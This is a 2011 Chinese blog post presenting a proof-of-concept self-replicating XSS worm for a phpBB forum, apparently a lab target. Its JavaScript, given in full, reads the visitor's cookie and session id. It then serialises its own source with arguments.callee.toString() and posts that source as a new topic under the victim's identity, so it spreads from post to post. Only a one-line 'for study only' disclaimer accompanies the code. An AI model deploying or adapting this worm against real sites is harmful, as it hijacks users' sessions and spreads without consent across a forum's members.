---
id: 1049
title: 'JS实现循环感染XSS Worm。'
date: '2011-03-27T21:35:38+08:00'
author: colordancer
layout: post
guid: 'http://www.colordancer.net/blog/?p=1049'
permalink: /2011/03/27/js%e5%ae%9e%e7%8e%b0%e5%be%aa%e7%8e%af%e6%84%9f%e6%9f%93xss-worm%e3%80%82/
views:
    - '1951'
classic-editor-remember:
    - classic-editor
categories:
    - 开发设计
---

这是去年十月份刚来北京时帮朋友做的一个poc。当时已经很久没有碰Web了，所以做起来遇到点小麻烦，但是最终搞定。

主要目的是在有XSS漏洞的论坛上发帖（包含恶意JS），当用户访问该贴时，帖中的JS代码会获得访问者的cookie，然后用改访问者的身份信息自动发一个具有同样功能的帖子。依次类推，实现Worm的功能。

获得Cookie的方法不难。伪造用户数据也不难。难点在于，怎样将一段js代码本身当做该段js代码中的一部分post出去。去几个论坛调查了几次，并结合自己的研究，通过以下方法解决：  
1\. 利用arguments.callee.toString();获得当前函数的string文本  
2\. 去掉将该段文本中的”换行“  
3\. encodeURIComponent()转义  
  
完整代码如下(**以下代码仅供学习之用，用作其他用途则与作者本人无关**）：  
&lt;script&gt;  
function xssworm(){  
cookie = document.cookie;  
sid\_pos=cookie.indexOf(“\_sid”);  
sid = cookie.substring(sid\_pos+5,sid\_pos+5+32);  
msg=”&lt;script&gt;”;  
msg+=arguments.callee.toString();  
msg=msg.replace(/\\r|\\n/g,””);  
msg+=”xssworm();&lt;/sc”; msg+=”ript&gt;”;  
msg=encodeURIComponent(msg);  
ajax=new XMLHttpRequest();  
ajax.open(“POST”,”http://www.xsslabphpbb.com/posting.php”,true);  
ajax.setRequestHeader(“Cookie”,cookie);  
ajax.setRequestHeader(“User-Agent”,”Mozilla/5.0″);  
ajax.setRequestHeader(“Keep-Alive”,”300″);  
ajax.setRequestHeader(“Content-Type”,”application/x-www-form-urlencoded”);  
ajax.setRequestHeader(“Host”,”www.xxx.com”);  
ajax.setRequestHeader(“Referer”,”http://www.xxx.com/posting.php?mode=newtopic&amp;f=1″);  
postData=’subject=This\_Is\_A\_XSS\_Worm&amp;addbbcode18=%23444444&amp;addbbcode20=0&amp;helpbox=Code+display%3A+%5Bcode%5Dcode%5B%2Fcode%5D++%28alt%2Bc%29&amp;message=’+msg+’&amp;poll\_title=&amp;add\_poll\_option\_text=&amp;poll\_length=&amp;mode=newtopic&amp;sid=’+sid+’&amp;f=1&amp;post=Submit’;  
ajax.send(postData);  
}  
xssworm();  
&lt;/script&gt;